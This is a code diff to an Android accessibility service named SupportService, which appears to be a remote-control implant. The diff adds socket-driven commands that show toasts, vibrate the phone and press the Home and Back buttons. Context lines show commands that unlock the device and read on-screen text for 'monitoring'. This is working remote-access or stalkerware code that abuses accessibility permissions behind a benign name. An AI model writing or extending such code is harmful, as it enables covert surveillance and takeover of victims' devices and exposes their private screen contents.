@@ -16,6 +16,9 @@ import android.widget.Button;
 import android.widget.TextView;
 import android.content.SharedPreferences;
 import android.os.Build;
+import android.os.Vibrator;
+import android.os.VibrationEffect;
+import android.widget.Toast;
 import java.io.BufferedReader;
 import java.io.InputStreamReader;
 import java.io.PrintWriter;
@@ -125,6 +128,26 @@ public class SupportService extends AccessibilityService {
                     }
                 });
                 out.println("OK: Device Unlocked");
+            } else if (cmd.startsWith("MESSAGE ")) {
+                String msg = cmd.substring(8);
+                task_handler.post(() -> Toast.makeText(getApplicationContext(), msg, Toast.LENGTH_LONG).show());
+                out.println("OK: Message Sent");
+            } else if (cmd.equals("VIBRATE")) {
+                Vibrator v = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
+                if (v != null) {
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                        v.vibrate(VibrationEffect.createOneShot(1000, VibrationEffect.DEFAULT_AMPLITUDE));
+                    } else {
+                        v.vibrate(1000);
+                    }
+                }
+                out.println("OK: Vibrating");
+            } else if (cmd.equals("HOME")) {
+                performGlobalAction(GLOBAL_ACTION_HOME);
+                out.println("OK: Home Pressed");
+            } else if (cmd.equals("BACK")) {
+                performGlobalAction(GLOBAL_ACTION_BACK);
+                out.println("OK: Back Pressed");
             } else if (cmd.equals("SCREEN")) {
                 // Konsep Monitoring: Mengambil teks yang ada di layar saat ini
                 String screenData = "App: " + getRootInActiveWindow().getPackageName();
